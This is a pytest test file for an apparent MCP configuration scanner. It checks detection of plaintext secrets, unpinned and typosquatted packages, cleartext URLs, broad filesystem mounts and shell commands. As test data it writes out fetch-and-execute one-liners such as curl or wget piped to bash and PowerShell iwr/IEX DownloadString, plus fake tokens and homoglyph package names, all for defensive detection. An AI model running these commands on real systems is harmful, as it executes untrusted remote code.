from pathlib import Path
from typing import Any

import pytest

from foretaster.config_loader import parse_config
from foretaster.models import Severity
from foretaster.rules import ALL_RULES, ScanTarget
from foretaster.rules.cleartext import CleartextTransport
from foretaster.rules.filesystem import BroadFilesystemAccess
from foretaster.rules.parse_problems import ParseProblems
from foretaster.rules.secrets import PlaintextSecret
from foretaster.rules.shell import ShellCommand
from foretaster.rules.typosquat import TyposquattedPackage
from foretaster.rules.unpinned import UnpinnedPackage
from tests.conftest import Check

GITHUB_TOKEN = "ghp_" + "a1B2" * 9
HIGH, MEDIUM, CRITICAL, LOW = Severity.HIGH, Severity.MEDIUM, Severity.CRITICAL, Severity.LOW


def test_rule_ids_are_unique_and_documented() -> None:
    ids = [rule.meta.id for rule in ALL_RULES]
    assert len(ids) == len(set(ids))
    for rule in ALL_RULES:
        assert rule.meta.title
        assert rule.meta.description
        assert rule.meta.remediation


# --- FT-C001 plaintext secrets ------------------------------------------------


@pytest.mark.parametrize(
    ("entry", "severity", "pointer"),
    [
        ({"command": "x", "env": {"GH": GITHUB_TOKEN}}, HIGH, "/mcpServers/s/env/GH"),
        ({"command": "x", "env": {"OPENAI_API_KEY": "abcd1234efgh"}}, MEDIUM, None),
        ({"command": "x", "env": {"dbPassword": "correct-horse"}}, MEDIUM, None),
        ({"command": "x", "env": {"NOTE": "-----BEGIN RSA PRIVATE KEY-----"}}, HIGH, None),
        ({"command": "x", "args": ["--api-key", "abcd1234efgh"]}, MEDIUM, "/mcpServers/s/args/1"),
        ({"command": "x", "args": ["--token=abcd1234efgh"]}, MEDIUM, "/mcpServers/s/args/0"),
        ({"command": "x", "args": ["sk-" + "a" * 30]}, HIGH, None),
        ({"command": "x", "args": ["--name", "AKIAABCDEFGHIJKLMNOP"]}, HIGH, None),
        ({"url": "https://h", "headers": {"Authorization": "Bearer abcdefghijkl"}}, MEDIUM, None),
        ({"url": "https://user:passw0rd123@host/x"}, MEDIUM, "/mcpServers/s/url"),
        ({"url": "https://host/x?token=abcd1234efgh"}, MEDIUM, None),
        ({"url": f"https://host/x?ref={GITHUB_TOKEN}"}, HIGH, None),
    ],
)
def test_secret_detected(
    check: Check, entry: dict[str, Any], severity: Severity, pointer: str | None
) -> None:
    (finding,) = check(PlaintextSecret, {"s": entry})
    assert finding.rule_id == "FT-C001"
    assert finding.severity is severity
    assert finding.server == "s"
    if pointer:
        assert finding.location.pointer == pointer


@pytest.mark.parametrize(
    "entry",
    [
        {"command": "x", "env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}},
        {"command": "x", "env": {"GITHUB_TOKEN": "${input:github_token}"}},
        {"command": "x", "env": {"API_KEY": "$API_KEY"}},
        {"command": "x", "env": {"API_KEY": "%API_KEY%"}},
        {"command": "x", "env": {"API_KEY": "<your key here>"}},
        {"command": "x", "env": {"API_KEY": "your-api-key-here"}},
        {"command": "x", "env": {"API_KEY": "{{ secrets.key }}"}},
        {"command": "x", "env": {"API_KEY": "short"}},
        {"command": "x", "env": {"MAX_TOKENS": "100000000"}},
        {"command": "x", "env": {"USE_AUTH": "true"}},
        {"command": "x", "env": {"KEY_FILE": "/home/u/keys/server.pem"}},
        {"command": "x", "env": {"AUTH_URL": "https://login.example.com/oauth"}},
        {"command": "x", "env": {"KEYBOARD_LAYOUT": "us-international"}},
        {"command": "x", "env": {"LOG_LEVEL": "debug-verbose"}},
        {"command": "x", "args": ["--port", "8080", "--verbose", "positional-value"]},
        {"url": "https://h", "headers": {"Authorization": "Bearer ${TOKEN}"}},
        {"url": "https://h", "headers": {"Authorization": "Bearer your-token-here"}},
        {"url": "https://host/path?page=2"},
        {"url": "http://[::1"},
    ],
)
def test_secret_not_reported(check: Check, entry: dict[str, Any]) -> None:
    assert check(PlaintextSecret, {"s": entry}) == []


def test_secret_never_appears_in_finding(check: Check) -> None:
    entry = {
        "command": "x",
        "env": {"A": GITHUB_TOKEN, "DB_PASSWORD": "correct-horse-battery"},
    }
    findings = check(PlaintextSecret, {"s": entry})
    assert len(findings) == 2
    dumped = "".join(finding.model_dump_json() for finding in findings)
    assert GITHUB_TOKEN not in dumped
    assert "correct-horse-battery" not in dumped
    assert "ghp_***" in dumped


# --- FT-C002 unpinned packages ------------------------------------------------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "some-server"]),
        ("npx", ["some-server@latest"]),
        ("npx", ["-y", "@scope/server@^1.0.0"]),
        ("npx", ["-p", "some-server", "binary"]),
        ("npx", ["github:user/repo"]),
        ("npx", ["user/repo"]),
        ("C:\\Program Files\\nodejs\\npx.cmd", ["-y", "some-server"]),
        ("cmd", ["/c", "npx", "-y", "some-server"]),
        ("env", ["NODE_ENV=production", "npx", "some-server"]),
        ("bunx", ["some-server"]),
        ("npm", ["exec", "--", "some-server"]),
        ("yarn", ["dlx", "some-server"]),
        ("uvx", ["some-server"]),
        ("uvx", ["--from", "git+https://github.com/o/r", "some-server"]),
        ("uv", ["tool", "run", "some-server>=1.0"]),
        ("pipx", ["run", "some-server"]),
        ("docker", ["run", "-i", "--rm", "-e", "TOKEN", "mcp/git"]),
        ("docker", ["run", "--rm", "mcp/git:latest"]),
        ("podman", ["run", "localhost:5000/team/server"]),
    ],
)
def test_unpinned_reported(check: Check, command: str, args: list[str]) -> None:
    (finding,) = check(UnpinnedPackage, {"s": {"command": command, "args": args}})
    assert finding.rule_id == "FT-C002"
    assert finding.severity is MEDIUM
    assert finding.evidence


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "some-server@1.2.3"]),
        ("npx", ["-y", "@scope/server@1.2.3-beta.1"]),
        ("npx", ["--package=@scope/server@1.0.0", "binary"]),
        ("npx", ["user/repo#abcdef1"]),
        ("npx", ["-y"]),
        ("pnpm", ["dlx", "some-server@1.0.0"]),
        ("pnpm", ["install"]),
        ("uvx", ["some-server==1.0"]),
        ("uvx", ["some-server[extra]@2025.1.14"]),
        ("uvx", ["--from", "git+https://github.com/o/r@0123abc", "some-server"]),
        ("uvx", ["--python", "3.12", "some-server==1.0"]),
        ("uvx", ["_not-a-name"]),
        ("uv", ["run", "server.py"]),
        ("pipx", ["run", "--spec", "some-server==1.0", "binary"]),
        ("docker", ["run", "--rm", "mcp/git:1.2"]),
        ("docker", ["run", "ghcr.io/o/server@sha256:" + "a" * 64]),
        ("docker", ["compose", "up"]),
        ("node", ["server.js"]),
        ("python", ["-m", "server"]),
        ("env", ["A=1"]),
    ],
)
def test_pinned_or_irrelevant(check: Check, command: str, args: list[str]) -> None:
    assert check(UnpinnedPackage, {"s": {"command": command, "args": args}}) == []


def test_unpinned_ignores_remote_servers(check: Check) -> None:
    assert check(UnpinnedPackage, {"s": {"url": "https://example.com/mcp"}}) == []


# --- FT-C003 cleartext transport ----------------------------------------------


@pytest.mark.parametrize(
    ("url", "severity"),
    [
        ("http://mcp.example.com/sse?key=1", HIGH),
        ("HTTP://mcp.example.com", HIGH),
        ("ws://mcp.example.com:9000/x", HIGH),
        ("http://8.8.8.8/mcp", HIGH),
        ("http://192.168.1.5:8080/mcp", MEDIUM),
        ("http://10.0.0.7/mcp", MEDIUM),
    ],
)
def test_cleartext_reported(check: Check, url: str, severity: Severity) -> None:
    (finding,) = check(CleartextTransport, {"s": {"url": url}})
    assert finding.severity is severity
    assert finding.evidence is not None
    assert "?" not in finding.evidence
    assert "/mcp" not in finding.evidence.split("//", 1)[1]


@pytest.mark.parametrize(
    "entry",
    [
        {"url": "https://mcp.example.com"},
        {"url": "http://localhost:3000/mcp"},
        {"url": "http://app.localhost/mcp"},
        {"url": "http://127.0.0.1:8000"},
        {"url": "http://[::1]:8080/mcp"},
        {"url": "http://[::1"},
        {"command": "node"},
    ],
)
def test_cleartext_not_reported(check: Check, entry: dict[str, Any]) -> None:
    assert check(CleartextTransport, {"s": entry}) == []


# --- FT-C004 shell commands ---------------------------------------------------


@pytest.mark.parametrize(
    ("command", "args", "severity"),
    [
        ("bash", ["-c", "curl -s https://x.sh/i | bash"], CRITICAL),
        ("sh", ["-c", "wget -qO- https://x.sh/i | sudo sh"], CRITICAL),
        ("bash", ["-c", "echo aGk= | base64 -d | bash"], CRITICAL),
        ("bash", ["-c", "eval $(curl https://x.sh)"], CRITICAL),
        ("powershell", ["-Command", "iwr https://x/i.ps1 | iex"], CRITICAL),
        ("pwsh", ["-c", "IEX (New-Object Net.WebClient).DownloadString('https://x')"], CRITICAL),
        ("curl https://x.sh/i | python3", [], CRITICAL),
        ("powershell.exe", ["-NoProfile", "-EncodedCommand", "ZQBjAGgAbwA="], HIGH),
        ("pwsh", ["-enc", "ZQBjAGgAbwA="], HIGH),
        ("sh", ["-c", "node server.js"], MEDIUM),
        ("/bin/bash", ["-lc", "node server.js"], MEDIUM),
        ("powershell", ["-Command", "node server.js"], MEDIUM),
    ],
)
def test_shell_reported(check: Check, command: str, args: list[str], severity: Severity) -> None:
    (finding,) = check(ShellCommand, {"s": {"command": command, "args": args}})
    assert finding.severity is severity


@pytest.mark.parametrize(
    "entry",
    [
        {"command": "cmd", "args": ["/c", "npx", "-y", "server@1.0.0"]},
        {"command": "bash", "args": ["start.sh"]},
        {"command": "node", "args": ["server.js", "-c", "config.json"]},
        {"command": "powershell", "args": ["-File", "start.ps1"]},
        {"url": "https://example.com"},
    ],
)
def test_shell_not_reported(check: Check, entry: dict[str, Any]) -> None:
    assert check(ShellCommand, {"s": entry}) == []


# --- FT-C005 typosquatting ----------------------------------------------------


@pytest.mark.parametrize(
    ("command", "args", "severity"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-githib"], MEDIUM),
        ("npx", ["-y", "@modelcontextprotocol/server-githubb@1.0.0"], MEDIUM),
        ("npx", ["-y", "@modelcontextprotocol/server-gihub"], MEDIUM),
        ("npx", ["-y", "modelcontextprotocol-server-github"], MEDIUM),
        ("npx", ["mcp-remoet"], MEDIUM),
        ("npx", ["mcp-remotE1"], MEDIUM),
        ("npx", ["mcp-r\u0435mote"], HIGH),
        ("uvx", ["mcp-server-gti"], MEDIUM),
        ("docker", ["run", "mcp/gitt:1.0"], MEDIUM),
    ],
)
def test_typosquat_reported(
    check: Check, command: str, args: list[str], severity: Severity
) -> None:
    (finding,) = check(TyposquattedPackage, {"s": {"command": command, "args": args}})
    assert finding.severity is severity
    assert finding.evidence is not None
    assert finding.evidence.isascii()


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github"]),
        ("npx", ["-y", "@Modelcontextprotocol/Server-GitHub@1.0.0"]),
        ("npx", ["-y", "completely-unrelated-server"]),
        ("npx", ["mcp-server"]),
        ("npx", ["evil/mcp-remote"]),
        ("uvx", ["mcp_server_git==1.0"]),
        ("uvx", ["mcp-server-gitea"]),
        ("docker", ["run", "mcp/git"]),
        ("node", ["server.js"]),
    ],
)
def test_typosquat_not_reported(check: Check, command: str, args: list[str]) -> None:
    assert check(TyposquattedPackage, {"s": {"command": command, "args": args}}) == []


# --- FT-C006 broad filesystem access ------------------------------------------


@pytest.mark.parametrize(
    ("command", "args", "severity"),
    [
        ("npx", ["-y", "server-filesystem", "/"], HIGH),
        ("npx", ["-y", "server-filesystem", "C:\\"], HIGH),
        ("npx", ["-y", "server-filesystem", "c:"], HIGH),
        ("npx", ["-y", "server-filesystem", "~"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "~/"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "$HOME"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "${HOME}/"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "/home/alice"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "/Users/alice/"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "C:\\Users\\alice"], MEDIUM),
        ("npx", ["-y", "server-filesystem", "%USERPROFILE%"], MEDIUM),
        ("docker", ["run", "-v", "/:/data", "mcp/filesystem"], HIGH),
        ("docker", ["run", "--volume=/home/alice:/data:ro", "mcp/filesystem"], MEDIUM),
        ("docker", ["run", "-v", "C:\\Users\\alice:/data", "mcp/filesystem"], MEDIUM),
        ("docker", ["run", "--mount", "type=bind,src=/,dst=/data", "mcp/filesystem"], HIGH),
        ("docker", ["run", "--mount=type=bind,source=/Users/a,target=/d", "mcp/x"], MEDIUM),
    ],
)
def test_filesystem_reported(
    check: Check, command: str, args: list[str], severity: Severity
) -> None:
    (finding,) = check(BroadFilesystemAccess, {"s": {"command": command, "args": args}})
    assert finding.severity is severity


@pytest.mark.parametrize(
    "entry",
    [
        {"command": "npx", "args": ["-y", "server-filesystem", "/home/alice/projects/app"]},
        {"command": "npx", "args": ["-y", "server-filesystem", "./data", "~/projects"]},
        {"command": "docker", "args": ["run", "-v", "/srv/app:/app", "mcp/filesystem", "/"]},
        {"command": "docker", "args": ["run", "mcp/filesystem", "-v"]},
        {"command": "docker", "args": ["run", "--mount", "type=tmpfs,dst=/tmp", "mcp/x"]},
        {"command": "docker", "args": ["run", "-v", "named-volume", "mcp/x"]},
        {"url": "https://example.com"},
    ],
)
def test_filesystem_not_reported(check: Check, entry: dict[str, Any]) -> None:
    assert check(BroadFilesystemAccess, {"s": entry}) == []


def test_filesystem_reports_each_path_once(check: Check) -> None:
    entry = {"command": "npx", "args": ["server-filesystem", "/", "/", "~"]}
    findings = check(BroadFilesystemAccess, {"s": entry})
    assert [finding.severity for finding in findings] == [HIGH, MEDIUM]


# --- FT-C000 parse problems ---------------------------------------------------


def test_parse_problems_become_findings() -> None:
    text = '{"mcpServers": {"a": {"command": "x"}, "a": {"command": "y"}, "b": 1}}'
    target = ScanTarget((parse_config(text, path=Path("mcp.json")),))
    findings = list(ParseProblems().check(target))
    assert {finding.severity for finding in findings} == {MEDIUM, LOW}
    assert {finding.location.pointer for finding in findings} == {"", "/mcpServers/b"}
    assert all(finding.server is None for finding in findings)
